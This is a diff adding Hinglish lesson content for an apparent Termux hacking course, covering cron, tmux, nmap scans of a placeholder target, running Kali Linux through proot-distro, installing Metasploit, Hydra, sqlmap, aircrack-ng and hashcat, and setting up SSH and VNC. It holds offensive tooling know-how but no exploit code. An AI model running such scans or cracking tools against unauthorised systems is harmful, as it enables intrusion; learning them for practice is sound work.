+        heading: "⏰ Cron Jobs & Automation",
+        content: `**Crontab Setup:**\n\`\`\`bash\ncrontab -e              # Crontab edit karo\ncrontab -l              # List karo\n\n# Format: minute hour day month weekday command\n# * = har\n# Har 5 minute:\n*/5 * * * * /path/to/script.sh\n\n# Har roz raat 2 baje:\n0 2 * * * /path/backup.sh\n\n# Har ghante:\n0 * * * * curl -s https://target.com >> /tmp/log.txt\n\n# Reboot pe:\n@reboot /path/start_services.sh\n\`\`\`\n\n**tmux — Multiple Sessions:**\n\`\`\`bash\npkg install tmux\n\ntmux new -s hacking          # "hacking" session banana\ntmux new -s monitoring       # "monitoring" session\ntmux ls                      # Sab sessions list\ntmux attach -t hacking       # Session resume\n\n# Termux band karo, session chalti rahe!\n# Phone restart ke baad tmux attach karo\n\n# tmux shortcuts:\n# Ctrl+B D = Detach (background mein)\n# Ctrl+B C = New window\n# Ctrl+B % = Vertical split\n# Ctrl+B \" = Horizontal split\n# Ctrl+B arrows = Pane switch\n\`\`\`\n\n**Notification on Script Completion:**\n\`\`\`bash\n#!/bin/bash\n# Koi bhi script ke end mein add karo\nnmap -sV target.com > results.txt\n\ntermux-notification \\\n  --title 'CYBER_TRACK' \\\n  --content 'Scan complete! Dekho results.txt' \\\n  --sound\ntermux-vibrate -d 500\n\`\`\``,
+      },
+    ],
+    keyPoints: [
+      "#!/bin/bash — script ka pehla line shebang hai",
+      "chmod +x script.sh — script ko executable banao",
+      "read -p 'Input: ' var — user se input lo",
+      "tmux — phone band karo, scripts background mein chalti rahein",
+      "termux-notification — script complete hone pe phone pe alert",
+    ],
+  },
+
+  "tmx-07": {
+    title: "Termux Advanced — proot-distro, SSH & Storage",
+    image: "https://images.unsplash.com/photo-1484417894907-623942c8ee29?w=900&fit=crop&auto=format",
+    tagline: "Phone pe poori Kali Linux — advanced Termux mastery!",
+    sections: [
+      {
+        heading: "🐧 proot-distro — Full Linux on Android",
+        content: `proot-distro Termux ka ek magical tool hai jo bina root ke Android pe poori Linux distro install karne deta hai — Ubuntu, Debian, Kali Linux, aur zyada!\n\n**Installation:**\n\`\`\`bash\npkg install proot-distro\n\`\`\`\n\n**Available Distros:**\n\`\`\`bash\nproot-distro list\n# ubuntu, debian, kali-linux, alpine, archlinux,\n# fedora, opensuse, void, gentoo, pardus, etc.\n\`\`\`\n\n**Ubuntu Install aur Login:**\n\`\`\`bash\nproot-distro install ubuntu         # Download + install\nproot-distro login ubuntu           # Ubuntu mein jao\n# Ab tum Ubuntu environment mein ho!\napt update && apt upgrade\napt install python3 git curl wget nmap\n\`\`\`\n\n**Kali Linux — Hacker's Choice:**\n\`\`\`bash\nproot-distro install kali-linux\nproot-distro login kali-linux\n# Kali mein:\napt update\napt install metasploit-framework   # Full Metasploit\napt install burpsuite              # Burp Suite\napt install sqlmap hydra nikto     # Web tools\napt install aircrack-ng hashcat    # WiFi + hash cracking\napt install bloodhound             # AD enumeration\napt install gobuster               # Directory brute forcing\n\`\`\`\n\n**proot Commands:**\n\`\`\`bash\nproot-distro list                   # Installed distros\nproot-distro backup ubuntu          # Backup lena\nproot-distro restore ubuntu backup  # Restore karna\nproot-distro remove ubuntu          # Uninstall\nproot-distro login ubuntu -- bash -c 'apt update'  # One command run\n\`\`\``,
+      },
+      {
+        heading: "🔐 SSH Server — Phone Ko Remote Access Do",
+        content: `Termux mein SSH server chala ke laptop se phone ko remotely access kar sakte ho — ya kisi ko bhi access do penetration testing practice ke liye!\n\n**SSH Server Setup:**\n\`\`\`bash\npkg install openssh\n\n# Password set karo\npasswd\n\n# SSH server start karo (port 8022 default)\nsshd\n\n# Server ki IP check karo\nifconfig | grep 'inet '\n\`\`\`\n\n**Laptop se Connect karna:**\n\`\`\`bash\n# Laptop ke terminal mein:\nssh $(whoami)@PHONE_IP -p 8022\n\n# Example:\nssh u0_a123@192.168.1.5 -p 8022\n\`\`\`\n\n**SSH Keys Setup (Password-less):**\n\`\`\`bash\n# Laptop pe:\nssh-keygen -t rsa -b 4096 -f ~/.ssh/termux_key\n\n# Public key phone pe copy karo\nssh-copy-id -i ~/.ssh/termux_key.pub \\\n  -p 8022 user@PHONE_IP\n\n# Ab password ke bina connect:\nssh -i ~/.ssh/termux_key -p 8022 user@PHONE_IP\n\`\`\`\n\n**Server Hardening:**\n\`\`\`bash\n# ~/.ssh/sshd_config edit karo\nnano $PREFIX/etc/ssh/sshd_config\n# Baad mein restart:\npkill sshd && sshd\n\`\`\`\n\n**Stop Server:**\n\`\`\`bash\npkill sshd\n\`\`\``,
+      },
+      {
+        heading: "💾 Termux Storage — Files Access",
+        content: `Termux ke ek common problem hai — phone ke files access karna. Yeh poori guide hai:\n\n**Storage Setup:**\n\`\`\`bash\ntermux-setup-storage\n# Allow karo popup mein\n# Ab ~/storage/ folder mil jayega\n\`\`\`\n\n**Storage Folders:**\n\`\`\`bash\nls ~/storage/\n# dcim/    → Camera photos/videos\n# downloads/ → Downloads folder\n# movies/  → Movies\n# music/   → Music\n# pictures/ → Pictures\n# shared/  → Internal storage root\n\`\`\`\n\n**File Operations:**\n\`\`\`bash\n# Phone se Termux mein copy\ncp ~/storage/downloads/wordlist.txt ~/\n\n# Termux se Downloads mein save\ncp ~/results.txt ~/storage/downloads/\n\n# Scan results save karo easily\nnmap -sV target > ~/storage/downloads/scan.txt\n\n# External SD card (agar hai)\nls ~/storage/external-1/\n\`\`\`\n\n**Termux File Manager:**\nFile manager apps (Cx File Explorer, Solid Explorer) se Termux folder directly access kar sakte ho — no permission needed agar app ko storage access diya ho.`,
+      },
+      {
+        heading: "🖥️ GUI Desktop — VNC se",
+        content: `Termux mein poora XFCE4 desktop environment chala sakte ho aur phone pe VNC se connect kar sakte ho — ya laptop se!\n\n**XFCE4 Desktop Setup:**\n\`\`\`bash\n# Step 1: x11-repo enable karo\npkg install x11-repo\n\n# Step 2: Desktop install karo\npkg install xfce4 tigervnc\n\n# Step 3: VNC server configure karo\nvncserver -localhost  # Password set karo (pehli baar)\n\n# Step 4: start-vnc.sh script banana\ncat > ~/start-vnc.sh << 'EOF'\n#!/bin/bash\nexport DISPLAY=:1\nvncserver -geometry 1280x720 -localhost no :1\necho "VNC server started on port 5901"\nEOF\nchmod +x ~/start-vnc.sh\n~/start-vnc.sh\n\`\`\`\n\n**Phone Pe Connect Karna:**\n1. VNC Viewer app download karo (BETTERNET ya RealVNC)\n2. localhost:5901 ya 127.0.0.1:5901 se connect karo\n3. Password enter karo\n4. Poora XFCE4 desktop milega!\n\n**Laptop Se Connect:**\n\`\`\`bash\n# SSH tunnel + VNC:\nssh -L 5901:localhost:5901 user@PHONE_IP -p 8022\n# Phir laptop mein VNC viewer mein localhost:5901\n\`\`\`\n\n**VNC Server Stop:**\n\`\`\`bash\nvncserver -kill :1\n\`\`\`\n\n**Helpful Tips:**\n• Screen OFF na karo VNC session mein — ya Wakelook app install karo\n• Battery drain zyada hogi — charger lagao\n• WiFi pe use karo — mobile data slow hoga`,
+      },
+    ],
+    keyPoints: [
+      "proot-distro install kali-linux — phone pe full Kali Linux!",
+      "sshd — SSH server start karo, laptop se phone access karo",
+      "termux-setup-storage → ~/storage/ — phone files Termux mein access karo",
+      "proot-distro backup ubuntu — important! Distro ka backup lena na bhoolo",
+      "pkg install x11-repo && xfce4 — GUI desktop bhi chal sakta hai!",
+    ],
+  },
 };
